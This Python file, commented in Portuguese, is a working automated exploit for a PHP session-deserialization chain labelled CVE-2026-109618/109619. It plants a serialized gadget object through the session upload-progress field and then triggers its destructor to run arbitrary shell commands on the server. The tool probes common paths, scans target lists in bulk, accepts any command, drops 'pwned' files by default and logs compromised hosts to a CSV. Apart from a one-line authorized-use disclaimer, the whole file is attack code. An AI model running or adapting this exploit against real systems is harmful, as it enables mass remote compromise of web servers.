#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PHP2Shell auto-exploit — CVE-2026-109618 / CVE-2026-109619.

Basta informar o site; o exploit descobre os caminhos e executa a cadeia RCE
automaticamente, criando um arquivo demo no servidor.

    python3 php2shell_rce.py http://alvo.com
    python3 php2shell_rce.py --targets sites.txt --output resultados.csv
    python3 php2shell_rce.py alvo.com --cmd 'id'
    python3 php2shell_rce.py http://alvo.com --seed-path /upload/ --trigger-path /app/

Como funciona (2 fases, automáticas)
------------------------------------
Fase 1 (seed): POST multipart no diretório com `session.serialize_handler =
php_serialize`. O valor de `PHP_SESSION_UPLOAD_PROGRESS` é `|<objeto serializado>`;
por usar `php_serialize`, o `|` e o objeto são gravados verbatim em sess_<sid>.

Fase 2 (fire): GET no diretório com handler `php` (default). Ele divide no primeiro
`|`, desserializa o objeto injetado; os bytes seguintes forçam falha de decode e
PHP destrói o objeto -> __destruct() -> system($cmd) ANTES do warning.

Em modo automático o exploit testa o URL informado e uma lista de caminhos comuns
como seed e como trigger até encontrar um par que funcione.

Uso apenas em sistemas autorizados.
"""

from __future__ import annotations

import argparse

BANNER = r"""
  ____  _          ____  _   _ _        _ _     
 / ___|(_) __ _  / ___|| | | | | _____(_) | ___ 
| |  _| | |/ _` |\___ \| |_| | |/ / _ \ | |/ _ \
| |_| | | | (_| | ___) |  _  |   <  __/ | | (_) |
 \____|_|_|\__,_|____/ |_| |_|_|\_\___|_|_|\___/ 
                                                 
   PHP2Shell RCE Exploit (CVE-2026-109618/109619)
   Criado por VandaTheGod
"""
import csv
import http.client
import itertools
import os
import random
import re
import string
import sys
import time
import urllib.parse

MARKER = "PHP2SHELL_RCE_109618"

# Caminhos candidatos: testados como seed (php_serialize) e como trigger (php).
COMMON_PATHS = [
    "/", "/index.php", "/app/", "/app/index.php", "/api/", "/api/index.php",
    "/upload/", "/upload/index.php", "/uploads/", "/files/", "/public/",
    "/portal/", "/user/", "/login.php", "/admin/", "/dashboard/", "/test/",
    "/seed/", "/seed/index.php", "/tmp/", "/info.php", "/phpinfo.php",
]


def rand_sid(n: int = 26) -> str:
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def normalize(site: str) -> str:
    if not re.match(r"^https?://", site):
        site = "http://" + site
    return site


def base_of(site: str) -> str:
    u = urllib.parse.urlparse(normalize(site))
    scheme = u.scheme or "http"
    netloc = u.netloc
    return f"{scheme}://{netloc}"


def join(base: str, path: str) -> str:
    return base.rstrip("/") + "/" + path.lstrip("/")


def build_payload(gadget: str, prop: str, cmd: str) -> bytes:
    g, p, c = gadget.encode(), prop.encode(), cmd.encode()
    obj = b'O:%d:"%s":1:{s:%d:"%s";s:%d:"%s";}' % (len(g), g, len(p), p, len(c), c)
    return b"|" + obj


def build_multipart(boundary: str, payload: bytes, field_progress: str) -> bytes:
    b = boundary.encode()
    crlf = b"\r\n"
    out = []
    out.append(b"--" + b + crlf)
    out.append(b'Content-Disposition: form-data; name="' + field_progress.encode() + b'"' + crlf)
    out.append(crlf)
    out.append(payload + crlf)
    out.append(b"--" + b + crlf)
    out.append(b'Content-Disposition: form-data; name="f"; filename="demo.txt"' + crlf)
    out.append(b"Content-Type: text/plain" + crlf)
    out.append(crlf)
    out.append(b"demo" + crlf)
    out.append(b"--" + b + b"--" + crlf)
    return b"".join(out)


def request(url: str, method: str, body: bytes | None, sid: str,
            content_type: str | None, timeout: float) -> tuple[int, bytes, dict]:
    u = urllib.parse.urlparse(url)
    host = u.hostname or "127.0.0.1"
    is_https = u.scheme.lower() == "https"
    port = u.port or (443 if is_https else 80)
    path = u.path or "/"
    if u.query:
        path += "?" + u.query

    headers = {
        "Host": host if port in (80, 443) else f"{host}:{port}",
        "User-Agent": "php2shell-auto-poc",
        "Cookie": f"PHPSESSID={sid}",
        "Connection": "close",
        "Accept": "*/*",
    }
    if content_type:
        headers["Content-Type"] = content_type
    if body is not None:
        headers["Content-Length"] = str(len(body))

    if is_https:
        import ssl
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        conn = http.client.HTTPSConnection(host, port, timeout=timeout, context=ctx)
    else:
        conn = http.client.HTTPConnection(host, port, timeout=timeout)
    conn.request(method, path, body=body, headers=headers)
    resp = conn.getresponse()
    data = resp.read()
    hdrs = {k.lower(): v for k, v in resp.getheaders()}
    status = resp.status
    conn.close()
    return status, data, hdrs


def run_chain(seed_url: str, trigger_url: str, sid: str, payload: bytes,
              field_progress: str, timeout: float) -> tuple[bool, str, bytes]:
    boundary = "----php2shell" + "".join(random.choice(string.ascii_lowercase) for _ in range(8))
    body = build_multipart(boundary, payload, field_progress)

    # Phase 1: seed
    st1, d1, _ = request(seed_url, "POST", body, sid,
                         f"multipart/form-data; boundary={boundary}", timeout)
    # Phase 2: fire
    st2, d2, _ = request(trigger_url, "GET", None, sid, None, timeout)

    text = d2.decode("latin1", "replace")
    ok = MARKER in text or "uid=" in text
    info = f"seed HTTP {st1} ({len(d1)}B) -> trigger HTTP {st2} ({len(d2)}B)"
    return ok, info, d2


def load_targets(file_path: str) -> list[str]:
    """Carrega lista de alvos de arquivo, um por linha."""
    targets = []
    with open(file_path, 'r', encoding='utf-8') as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith('#'):
                targets.append(line)
    return targets


def write_csv(output_path: str, results: list[dict]) -> None:
    """Grava resultados em CSV."""
    if not results:
        return
    fieldnames = ['target', 'status', 'seed_path', 'trigger_path', 'seed_url',
                  'trigger_url', 'uid', 'user', 'gid', 'groups', 'demo_files',
                  'timestamp', 'output', 'error']
    with open(output_path, 'w', encoding='utf-8', newline='') as f:
        writer = csv.DictWriter(f, fieldnames=fieldnames)
        writer.writeheader()
        writer.writerows(results)


def test_single_target(site: str, args) -> dict:
    """Testa um único alvo e retorna resultado."""
    base = base_of(site)
    result = {
        'target': site,
        'status': 'FAIL',
        'seed_path': '',
        'trigger_path': '',
        'seed_url': '',
        'trigger_url': '',
        'uid': '',
        'user': '',
        'gid': '',
        'groups': '',
        'demo_files': '',
        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
        'output': '',
        'error': ''
    }

    # Comando padrão ou customizado
    if args.cmd:
        cmd = args.cmd
        if MARKER not in cmd:
            cmd = f"{cmd}; echo {MARKER}"
    else:
        demo = (
            f'F=/tmp/pwned_php2shell.txt; echo {MARKER} > $F; '
            f'echo "RCE via CVE-2026-109618 (PHP2Shell)" >> $F; '
            f'echo "host: $(uname -n)" >> $F; '
            f'echo "user: $(id -un)" >> $F; '
        )
        cmd = (
            demo
            + 'cp $F /var/tmp/pwned_php2shell.txt 2>/dev/null; '
            + 'cp $F ./pwned_php2shell.txt 2>/dev/null; '
            + 'echo "== pwd: $(pwd)"; '
            + 'ls -la $F /var/tmp/pwned_php2shell.txt $(pwd)/pwned_php2shell.txt 2>&1; '
            + 'echo "== content =="; cat $F; '
            + f'echo {MARKER}; id'
        )

    payload = build_payload(args.gadget, args.prop, cmd)

    # Monta pares (seed, trigger)
    if args.seed_path or args.trigger_path:
        seed_path = args.seed_path or "/"
        trigger_path = args.trigger_path or "/"
        pairs = [(seed_path, trigger_path)]
    elif args.strict_path:
        # Modo restrito: testa SOMENTE o caminho informado como seed e como trigger.
        # Use quando quiser validar um diretorio especifico sem varrer o host todo.
        p = urllib.parse.urlparse(normalize(site)).path or "/"
        pairs = [(p, p)]
    else:
        # Modo automático: pré-sonda os caminhos
        candidates = []
        given = urllib.parse.urlparse(normalize(site)).path or "/"
        candidates.append(given)
        for p in COMMON_PATHS:
            if p not in candidates:
                candidates.append(p)

        live = []
        for p in candidates:
            try:
                st, _, _ = request(join(base, p), "GET", None, rand_sid(), None, args.timeout)
            except Exception:
                continue
            if st in (200, 302, 401, 403, 500):
                live.append(p)

        if not live:
            live = candidates[:1] or ["/"]

        pairs = list(itertools.product(live, repeat=2))

    sid = args.sid or rand_sid()

    for seed_path, trigger_path in pairs:
        seed_url = join(base, seed_path)
        trigger_url = join(base, trigger_path)

        try:
            ok, info, data = run_chain(seed_url, trigger_url, sid, payload, args.field, args.timeout)
        except Exception as e:
            if args.verbose:
                print(f"    [{site}] {seed_path} -> {trigger_path}: erro {e}")
            continue

        if ok:
            result['status'] = 'SUCCESS'
            result['seed_path'] = seed_path
            result['trigger_path'] = trigger_path
            result['seed_url'] = seed_url
            result['trigger_url'] = trigger_url
            text = data.decode("latin1", "replace")
            result['output'] = text[:500]  # truncar para CSV

            # Extrair uid/gid/groups (o nome do usuario pode conter '-', ex. www-data)
            m = re.search(
                r"uid=(\d+)\(([^)]+)\)\s+gid=(\d+)\(([^)]+)\)\s+groups=([^\n]+)", text)
            if m:
                result['uid'] = m.group(1)
                result['user'] = m.group(2)
                result['gid'] = m.group(3)
                result['groups'] = m.group(5).strip()

            # Caminhos do arquivo demo. Considera apenas arquivos que existem de fato:
            # linhas de `ls -la` no formato "-rw-r--r-- 1 user user 88 /caminho",
            # ignorando mensagens de erro ("cannot access '...': No such file").
            found = []
            for line in text.splitlines():
                if line.startswith('-') or line.startswith('d'):
                    parts = line.split()
                    if parts and parts[-1].endswith('pwned_php2shell.txt'):
                        found.append(parts[-1])
            result['demo_files'] = '; '.join(sorted(set(found)))
            if not result['demo_files']:
                result['demo_files'] = 'pwned_php2shell.txt (path nao confirmado na resposta)'

            if args.verbose:
                print(f"[+] RCE CONFIRMADO")
                print(f"[+] SEED    (php_serialize): {seed_url}")
                print(f"[+] TRIGGER (php)          : {trigger_url}")
                print(f"[+] usuario: {result['user']} (uid={result['uid']})")
                print(f"[+] arquivos demo: {result['demo_files']}")
                given_path = urllib.parse.urlparse(normalize(site)).path or "/"
                if seed_path != given_path or trigger_path != given_path:
                    print(f"[!] NOTA: o alvo vulneravel fica em {seed_url} (seed) e "
                          f"{trigger_url} (trigger) — diferente do caminho informado "
                          f"({site}). Use --strict-path para testar apenas o caminho dado.")
            return result

    result['error'] = 'No working seed/trigger pair found'
    if args.verbose:
        print(f"[-] {site} FAIL: {result['error']}")
    return result


def main() -> int:
    print(BANNER)
    ap = argparse.ArgumentParser(
        description="PHP2Shell auto-exploit (CVE-2026-109618/109619) — informe o site e ele explora"
    )
    ap.add_argument("site", nargs="?", help="site alvo único, ex: http://alvo.com")
    ap.add_argument("--targets", "-t", help="arquivo com lista de sites (um por linha)")
    ap.add_argument("--output", "-o", help="arquivo de saída CSV com resultados")
    ap.add_argument("--seed-path", help="caminho do diretorio php_serialize (modo manual)")
    ap.add_argument("--trigger-path", help="caminho do diretorio php (modo manual)")
    ap.add_argument("--gadget", default="Logger", help="classe gadget (default: Logger)")
    ap.add_argument("--prop", default="cmd", help="propriedade com o comando (default: cmd)")
    ap.add_argument("--cmd", default=None, help="comando a executar (default: cria demo.txt)")
    ap.add_argument("--field", default="PHP_SESSION_UPLOAD_PROGRESS",
                    help="nome do campo de progresso")
    ap.add_argument("--sid", default=None)
    ap.add_argument("--timeout", type=float, default=20.0)
    ap.add_argument("--delay", type=float, default=0.5, help="delay entre alvos (segundos)")
    ap.add_argument("--strict-path", action="store_true",
                    help="testa SOMENTE o caminho informado (nao varre o host todo)")
    ap.add_argument("--verbose", "-v", action="store_true", help="mostra cada tentativa")
    ap.add_argument("--quiet", "-q", action="store_true", help="apenas resultados no CSV")
    a = ap.parse_args()

    # Validação: precisa de site único ou arquivo de targets
    if not a.site and not a.targets:
        ap.error("Informe um site ou use --targets com arquivo de lista")

    # Carregar targets
    if a.targets:
        if not os.path.exists(a.targets):
            print(f"[-] Arquivo não encontrado: {a.targets}")
            return 1
        targets = load_targets(a.targets)
        print(f"[*] Carregados {len(targets)} alvos de {a.targets}")
    else:
        targets = [a.site]

    # Deduplica preservando a ordem (evita testar o mesmo host duas vezes)
    seen = set()
    unique = []
    for t in targets:
        key = base_of(t)
        if key not in seen:
            seen.add(key)
            unique.append(t)
    if len(unique) != len(targets):
        print(f"[*] Deduplicado: {len(targets)} -> {len(unique)} alvos unicos")
    targets = unique

    results = []
    success_count = 0
    fail_count = 0
    start_time = time.time()

    for i, site in enumerate(targets, 1):
        site = site.strip()
        if not site:
            continue

        if not a.quiet:
            print(f"\n[{i}/{len(targets)}] Testando: {site}")

        result = test_single_target(site, a)
        results.append(result)

        if result['status'] == 'SUCCESS':
            success_count += 1
        else:
            fail_count += 1

        # Grava incrementalmente para nao perder progresso em listas grandes
        if a.output:
            write_csv(a.output, results)

        # Delay entre alvos
        if i < len(targets) and a.delay > 0:
            time.sleep(a.delay)

    # Tempo total
    elapsed = time.time() - start_time

    # Imprimir resumo
    print("\n" + "=" * 60)
    print(f"RESUMO: {len(targets)} alvos testados em {elapsed:.1f}s")
    print(f"  SUCCESS: {success_count}")
    print(f"  FAIL:    {fail_count}")
    print("=" * 60)

    # Salvar CSV
    if a.output:
        write_csv(a.output, results)
        print(f"[+] Resultados salvos em: {a.output}")

    # Imprimir alvos com sucesso
    if not a.quiet and success_count > 0:
        print("\n[SUCCESS] Alvos com RCE: ")
        for r in results:
            if r['status'] == 'SUCCESS':
                print(f"  alvo={r['target']}")
                print(f"     seed (php_serialize): {r['seed_url']}")
                print(f"     trigger (php)       : {r['trigger_url']}")
                print(f"     usuario={r['user']} (uid={r['uid']})  arquivos={r['demo_files']}")

    return 0 if success_count > 0 else 1


if __name__ == "__main__":
    raise SystemExit(main())
